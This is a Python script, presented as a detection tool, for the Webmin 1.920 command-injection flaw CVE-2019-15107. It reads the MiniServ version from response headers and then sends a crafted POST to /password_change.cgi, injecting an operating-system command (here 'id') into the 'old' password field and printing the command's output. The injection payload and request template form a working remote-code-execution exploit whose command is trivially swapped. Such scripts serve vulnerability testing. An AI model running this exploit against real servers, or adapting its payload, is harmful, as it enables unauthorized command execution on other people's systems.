#!/bin/python3


# Webmin <=1.920 command injection - CVE-2019-15107
#
#This script determinate if a server is running a vulnerable version of Webmin.
#Takes as input a url (which must be according to a certain form), and whit the function version() its going to make a GET request to the home page of the site. 
#From the response it extracts the information of the http headers, here we can find a header like: Server: MiniServ/1.910
#The function extract the version and pass a array whit the result to the main function .
#If the result of the version() function is empty, it means that a Webmin header was not found, so it is not a Webmin server.
#If the Header is present, it do a check that the version is not higher than the vulnerable versioner(1.920). If higher it is not vulnerable.
#So if the version is vulnerable it will proceed with the exploit() function, which used the poc bellow and create a POST request to change password to the page "/password_change.cgi". 
#In the post data will be inject a command of the operating system (in this case id) in the "old" field.
#If the post request does not give errors, and we have a 200 response and the result of O.S. command, we can prove that the site is indeed vulnerable.
#
#
# Refernce : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107
#
# Based on the Poc: https://github.com/AdministratorGithub/CVE-2019-15107/blob/master/CVE-2019-15107.py and https://www.exploit-db.com/exploits/47230
#
#
#
# To do, to improve the script and weaknesses:
# - Implement a function to read a file with a list of url, to scan multiple targets.
# - Create checks on user input, at this point if a non url is placed on the input, it will throw a big error.
# - Test the script with an actually different version.
# - Improve and find a better way to control the version.
# - Implement other checks if possible, to determine if it is indeed a Webmin service.  
#
#



import math
import os
import random
import re
import sys
import urllib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def version(url):

#Create GET request to the page and save the response header on a string
    r = requests.get(url=url, verify=False)
    page = str(r.headers)
    version="'Server': 'MiniServ/(.+?)'"

#Find and extract the content of the server header
    patternVersion=re.compile(version)
    RawVersion = re.findall(patternVersion,page)   
    v = RawVersion[0].split(".")

#Return the server version extracted 
    return v


 
def exploit(url):

    cmd = "id" # command to execute

#Template of the POST request
    urls = url + "/password_change.cgi"
    headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "{}/session_login.cgi".format(urls),
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    }

#POST data whit inside the payload for RCE, in the "old" field 
    payload="user=rootxx&pam=&expired=2&old={}&new1=test2&new2=test2".format(cmd)

#make the POST request
    r = requests.post(url=urls, headers=headers, data=payload, verify=False)

    if r.status_code ==200 and "The current password is " in r.text : #check if the POST request and the payload worked
        rs = re.compile(r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>",flags=re.DOTALL)
        result = rs.findall(r.text)

        vuln = 1 
        print ("Execute result:" + result[0])# print command result
    else:
        vuln = 0
#return vuln, if vulnerable 1 if not 0
    return vuln



if __name__ == '__main__':
    print("Webmin <=1.920 command injection - CVE-2019-15107")
    print("Detection Script by Rusz Vasile Adrian \n")
    print("Please insert the full url of the site to test, using the format: https://url:port Es. https://127.0.0.1:10000  ")
    url = input("Insert url:  ") # read user url 
    version = version(url) 
    while True:
          if version : # check if the version array is empty, if is empty is not  Webmin
             print("\n The site is a Webmin webserver!\n")
             print("Checking the version of Wembin ==> ")
             print("The version of Webmin is " + ".".join(version))
             if int(version[1]) <= 920 and int(version[0]) <= 1: #check if the version is not higher that 1.920 
                print("This version should be vulnerable!\n")
                print("Check if the site is vulnerable: ")
                print("Trying to execute the linux command 'id' ==>")
                result = exploit(url) # run the exploit
                if result == 1 : #if the result of exploit function is 1, its vulnerable  
                   print("Warning ====> This site is vulnerbale to CVE-2019-15107!!! \n")
                   break
                else:
                   print("This site does not seem vulnerable! ")
                   break
             else:
                 print("This version does not seem vulnerable!")
                 break           
          else: 
             print("This site does not seem a Webmin webserver ")
             break 



 
